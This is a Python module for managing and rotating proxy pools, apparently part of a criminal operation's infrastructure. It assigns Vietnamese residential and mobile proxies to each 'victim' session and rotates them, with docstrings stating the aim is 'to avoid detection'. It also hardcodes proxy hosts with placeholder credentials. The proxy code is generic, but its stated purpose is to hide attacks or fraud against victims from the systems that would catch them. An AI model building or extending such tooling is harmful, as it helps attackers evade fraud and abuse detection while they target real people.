"""
Proxy Management Engine
Advanced proxy pool management and rotation
"""

import asyncio
import random
import logging
import httpx
from datetime import datetime, timezone, timedelta
from typing import Dict, List, Optional, Any, Tuple
from dataclasses import dataclass
from enum import Enum
import json

logger = logging.getLogger(__name__)

class ProxyType(Enum):
    RESIDENTIAL = "residential"
    DATACENTER = "datacenter"
    MOBILE = "mobile"
    ROTATING = "rotating"

class ProxyStatus(Enum):
    HEALTHY = "healthy"
    UNHEALTHY = "unhealthy"
    TESTING = "testing"
    BLOCKED = "blocked"

@dataclass
class Proxy:
    """Proxy server data structure"""
    id: str
    host: str
    port: int
    username: Optional[str]
    password: Optional[str]
    proxy_type: ProxyType
    country: str
    city: Optional[str]
    isp: Optional[str]
    status: ProxyStatus
    last_used: datetime
    success_rate: float
    response_time: float
    failure_count: int
    created_at: datetime

class AdvancedProxyManager:
    """Advanced proxy pool management system"""
    
    def __init__(self):
        self.proxy_pools = {
            'residential_vietnam': [],
            'mobile_vietnam': [],
            'datacenter_singapore': [],
            'rotating_global': []
        }
        self.session_assignments = {}  # victim_id -> proxy_id mapping
        self.health_monitor = ProxyHealthMonitor()
        self.load_balancer = ProxyLoadBalancer()
        
    async def initialize_proxy_pools(self) -> None:
        """Initialize proxy pools with available proxies"""
        
        # Vietnam residential proxies
        vietnam_residential = [
            Proxy(
                id="vn_res_001",
                host="203.162.4.191",
                port=1080,
                username="vn_user_001",
                password="vn_pass_001",
                proxy_type=ProxyType.RESIDENTIAL,
                country="VN",
                city="Ho Chi Minh City",
                isp="Viettel",
                status=ProxyStatus.HEALTHY,
                last_used=datetime.now(timezone.utc),
                success_rate=0.95,
                response_time=0.8,
                failure_count=0,
                created_at=datetime.now(timezone.utc)
            ),
            Proxy(
                id="vn_res_002",
                host="14.169.0.1",
                port=1080,
                username="vn_user_002",
                password="vn_pass_002",
                proxy_type=ProxyType.RESIDENTIAL,
                country="VN",
                city="Hanoi",
                isp="Vinaphone",
                status=ProxyStatus.HEALTHY,
                last_used=datetime.now(timezone.utc),
                success_rate=0.92,
                response_time=1.2,
                failure_count=0,
                created_at=datetime.now(timezone.utc)
            ),
            Proxy(
                id="vn_res_003",
                host="27.64.0.1",
                port=1080,
                username="vn_user_003",
                password="vn_pass_003",
                proxy_type=ProxyType.RESIDENTIAL,
                country="VN",
                city="Da Nang",
                isp="Mobifone",
                status=ProxyStatus.HEALTHY,
                last_used=datetime.now(timezone.utc),
                success_rate=0.88,
                response_time=1.5,
                failure_count=0,
                created_at=datetime.now(timezone.utc)
            )
        ]
        
        # Vietnam mobile proxies
        vietnam_mobile = [
            Proxy(
                id="vn_mob_001",
                host="117.0.0.1",
                port=1080,
                username="vn_mob_user_001",
                password="vn_mob_pass_001",
                proxy_type=ProxyType.MOBILE,
                country="VN",
                city="Ho Chi Minh City",
                isp="Viettel Mobile",
                status=ProxyStatus.HEALTHY,
                last_used=datetime.now(timezone.utc),
                success_rate=0.90,
                response_time=1.0,
                failure_count=0,
                created_at=datetime.now(timezone.utc)
            ),
            Proxy(
                id="vn_mob_002",
                host="118.0.0.1",
                port=1080,
                username="vn_mob_user_002",
                password="vn_mob_pass_002",
                proxy_type=ProxyType.MOBILE,
                country="VN",
                city="Hanoi",
                isp="Vinaphone Mobile",
                status=ProxyStatus.HEALTHY,
                last_used=datetime.now(timezone.utc),
                success_rate=0.87,
                response_time=1.3,
                failure_count=0,
                created_at=datetime.now(timezone.utc)
            )
        ]
        
        # Singapore datacenter proxies
        singapore_datacenter = [
            Proxy(
                id="sg_dc_001",
                host="103.1.1.1",
                port=1080,
                username="sg_dc_user_001",
                password="sg_dc_pass_001",
                proxy_type=ProxyType.DATACENTER,
                country="SG",
                city="Singapore",
                isp="DigitalOcean",
                status=ProxyStatus.HEALTHY,
                last_used=datetime.now(timezone.utc),
                success_rate=0.98,
                response_time=0.3,
                failure_count=0,
                created_at=datetime.now(timezone.utc)
            ),
            Proxy(
                id="sg_dc_002",
                host="103.2.2.2",
                port=1080,
                username="sg_dc_user_002",
                password="sg_dc_pass_002",
                proxy_type=ProxyType.DATACENTER,
                country="SG",
                city="Singapore",
                isp="AWS",
                status=ProxyStatus.HEALTHY,
                last_used=datetime.now(timezone.utc),
                success_rate=0.99,
                response_time=0.2,
                failure_count=0,
                created_at=datetime.now(timezone.utc)
            )
        ]
        
        # Global rotating proxies
        global_rotating = [
            Proxy(
                id="global_rot_001",
                host="proxy1.rotating.com",
                port=1080,
                username="global_user_001",
                password="global_pass_001",
                proxy_type=ProxyType.ROTATING,
                country="US",
                city="New York",
                isp="Rotating Proxy Service",
                status=ProxyStatus.HEALTHY,
                last_used=datetime.now(timezone.utc),
                success_rate=0.85,
                response_time=2.0,
                failure_count=0,
                created_at=datetime.now(timezone.utc)
            )
        ]
        
        # Populate proxy pools
        self.proxy_pools['residential_vietnam'] = vietnam_residential
        self.proxy_pools['mobile_vietnam'] = vietnam_mobile
        self.proxy_pools['datacenter_singapore'] = singapore_datacenter
        self.proxy_pools['rotating_global'] = global_rotating
        
        logger.info(f"Initialized proxy pools with {sum(len(pool) for pool in self.proxy_pools.values())} proxies")
    
    async def assign_victim_proxy(self, victim_id: str, geo_preference: str = 'VN') -> Optional[Proxy]:
        """Assign optimal proxy per victim session to avoid detection"""
        
        # Check if victim already has assigned proxy
        if victim_id in self.session_assignments:
            assigned_proxy_id = self.session_assignments[victim_id]
            proxy = await self.get_proxy_by_id(assigned_proxy_id)
            if proxy and proxy.status == ProxyStatus.HEALTHY:
                return proxy
        
        # Select optimal proxy based on geolocation and load balancing
        suitable_proxies = await self.filter_proxies_by_geo(geo_preference)
        selected_proxy = await self.select_optimal_proxy(suitable_proxies)
        
        if selected_proxy:
            # Lock proxy to victim session
            self.session_assignments[victim_id] = selected_proxy.id
            selected_proxy.last_used = datetime.now(timezone.utc)
            logger.info(f"Assigned proxy {selected_proxy.id} to victim {victim_id}")
        
        return selected_proxy
    
    async def filter_proxies_by_geo(self, geo_preference: str) -> List[Proxy]:
        """Filter proxies by geographic preference"""
        
        if geo_preference == 'VN':
            return (self.proxy_pools['residential_vietnam'] + 
                   self.proxy_pools['mobile_vietnam'])
        elif geo_preference == 'SG':
            return self.proxy_pools['datacenter_singapore']
        else:
            # Return all healthy proxies
            all_proxies = []
            for pool in self.proxy_pools.values():
                all_proxies.extend(pool)
            return all_proxies
    
    async def select_optimal_proxy(self, proxies: List[Proxy]) -> Optional[Proxy]:
        """Select optimal proxy using load balancing algorithm"""
        
        if not proxies:
            return None
        
        # Filter healthy proxies
        healthy_proxies = [p for p in proxies if p.status == ProxyStatus.HEALTHY]
        
        if not healthy_proxies:
            return None
        
        # Use weighted selection based on success rate and response time
        weights = []
        for proxy in healthy_proxies:
            # Higher weight for better success rate and lower response time
            weight = proxy.success_rate * (1.0 / (1.0 + proxy.response_time))
            weights.append(weight)
        
        # Weighted random selection
        total_weight = sum(weights)
        if total_weight == 0:
            return random.choice(healthy_proxies)
        
        rand = random.uniform(0, total_weight)
        cumulative = 0
        
        for i, weight in enumerate(weights):
            cumulative += weight
            if rand <= cumulative:
                return healthy_proxies[i]
        
        return healthy_proxies[-1]
    
    async def get_proxy_by_id(self, proxy_id: str) -> Optional[Proxy]:
        """Get proxy by ID"""
        for pool in self.proxy_pools.values():
            for proxy in pool:
                if proxy.id == proxy_id:
                    return proxy
        return None
    
    async def test_proxy_health(self, proxy: Proxy) -> bool:
        """Test proxy health and update status"""
        
        try:
            proxy_url = f"socks5://{proxy.username}:{proxy.password}@{proxy.host}:{proxy.port}"
            
            async with httpx.AsyncClient(
                proxies=proxy_url,
                timeout=10.0
            ) as client:
                response = await client.get("https://httpbin.org/ip")
                
                if response.status_code == 200:
                    proxy.status = ProxyStatus.HEALTHY
                    proxy.success_rate = min(proxy.success_rate + 0.01, 1.0)
                    proxy.failure_count = 0
                    return True
                else:
                    await self.mark_proxy_failure(proxy)
                    return False
                    
        except Exception as e:
            logger.warning(f"Proxy {proxy.id} health check failed: {e}")
            await self.mark_proxy_failure(proxy)
            return False
    
    async def mark_proxy_failure(self, proxy: Proxy) -> None:
        """Mark proxy as failed and update statistics"""
        
        proxy.failure_count += 1
        proxy.success_rate = max(proxy.success_rate - 0.05, 0.0)
        
        if proxy.failure_count >= 5:
            proxy.status = ProxyStatus.UNHEALTHY
            logger.warning(f"Proxy {proxy.id} marked as unhealthy after {proxy.failure_count} failures")
    
    async def rotate_proxy_for_victim(self, victim_id: str) -> Optional[Proxy]:
        """Rotate proxy for victim to avoid detection"""
        
        # Remove current assignment
        if victim_id in self.session_assignments:
            del self.session_assignments[victim_id]
        
        # Assign new proxy
        return await self.assign_victim_proxy(victim_id)
    
    async def get_proxy_statistics(self) -> Dict[str, Any]:
        """Get comprehensive proxy statistics"""
        
        total_proxies = sum(len(pool) for pool in self.proxy_pools.values())
        healthy_proxies = sum(
            len([p for p in pool if p.status == ProxyStatus.HEALTHY])
            for pool in self.proxy_pools.values()
        )
        
        avg_success_rate = 0
        avg_response_time = 0
        
        all_proxies = []
        for pool in self.proxy_pools.values():
            all_proxies.extend(pool)
        
        if all_proxies:
            avg_success_rate = sum(p.success_rate for p in all_proxies) / len(all_proxies)
            avg_response_time = sum(p.response_time for p in all_proxies) / len(all_proxies)
        
        return {
            'total_proxies': total_proxies,
            'healthy_proxies': healthy_proxies,
            'unhealthy_proxies': total_proxies - healthy_proxies,
            'health_percentage': (healthy_proxies / total_proxies * 100) if total_proxies > 0 else 0,
            'average_success_rate': avg_success_rate,
            'average_response_time': avg_response_time,
            'active_sessions': len(self.session_assignments),
            'pool_breakdown': {
                pool_name: {
                    'total': len(pool),
                    'healthy': len([p for p in pool if p.status == ProxyStatus.HEALTHY]),
                    'unhealthy': len([p for p in pool if p.status == ProxyStatus.UNHEALTHY])
                }
                for pool_name, pool in self.proxy_pools.items()
            }
        }
    
    async def cleanup_expired_sessions(self) -> None:
        """Cleanup expired session assignments"""
        
        current_time = datetime.now(timezone.utc)
        expired_sessions = []
        
        for victim_id, proxy_id in self.session_assignments.items():
            proxy = await self.get_proxy_by_id(proxy_id)
            if proxy and (current_time - proxy.last_used).total_seconds() > 3600:  # 1 hour
                expired_sessions.append(victim_id)
        
        for victim_id in expired_sessions:
            del self.session_assignments[victim_id]
            logger.info(f"Cleaned up expired session for victim {victim_id}")

class ProxyHealthMonitor:
    """Monitor proxy health and performance"""
    
    def __init__(self):
        self.health_check_interval = 300  # 5 minutes
        self.monitoring_active = False
    
    async def start_monitoring(self, proxy_manager: AdvancedProxyManager) -> None:
        """Start continuous proxy health monitoring"""
        
        self.monitoring_active = True
        logger.info("Starting proxy health monitoring")
        
        while self.monitoring_active:
            try:
                await self.perform_health_checks(proxy_manager)
                await asyncio.sleep(self.health_check_interval)
            except Exception as e:
                logger.error(f"Error in proxy health monitoring: {e}")
                await asyncio.sleep(60)  # Wait 1 minute before retry
    
    async def stop_monitoring(self) -> None:
        """Stop proxy health monitoring"""
        self.monitoring_active = False
        logger.info("Stopped proxy health monitoring")
    
    async def perform_health_checks(self, proxy_manager: AdvancedProxyManager) -> None:
        """Perform health checks on all proxies"""
        
        all_proxies = []
        for pool in proxy_manager.proxy_pools.values():
            all_proxies.extend(pool)
        
        # Test proxies in parallel
        tasks = []
        for proxy in all_proxies:
            if proxy.status == ProxyStatus.HEALTHY:
                tasks.append(proxy_manager.test_proxy_health(proxy))
        
        if tasks:
            await asyncio.gather(*tasks, return_exceptions=True)
        
        # Cleanup expired sessions
        await proxy_manager.cleanup_expired_sessions()

class ProxyLoadBalancer:
    """Load balancer for proxy distribution"""
    
    def __init__(self):
        self.load_weights = {
            'residential_vietnam': 0.4,
            'mobile_vietnam': 0.3,
            'datacenter_singapore': 0.2,
            'rotating_global': 0.1
        }
    
    def calculate_load_weight(self, proxy: Proxy) -> float:
        """Calculate load weight for proxy selection"""
        
        base_weight = self.load_weights.get(proxy.proxy_type.value, 0.1)
        success_multiplier = proxy.success_rate
        response_multiplier = 1.0 / (1.0 + proxy.response_time)
        
        return base_weight * success_multiplier * response_multiplier
    
    def select_proxy_by_load(self, proxies: List[Proxy]) -> Optional[Proxy]:
        """Select proxy based on load balancing"""
        
        if not proxies:
            return None
        
        weights = [self.calculate_load_weight(proxy) for proxy in proxies]
        total_weight = sum(weights)
        
        if total_weight == 0:
            return random.choice(proxies)
        
        rand = random.uniform(0, total_weight)
        cumulative = 0
        
        for i, weight in enumerate(weights):
            cumulative += weight
            if rand <= cumulative:
                return proxies[i]
        
        return proxies[-1]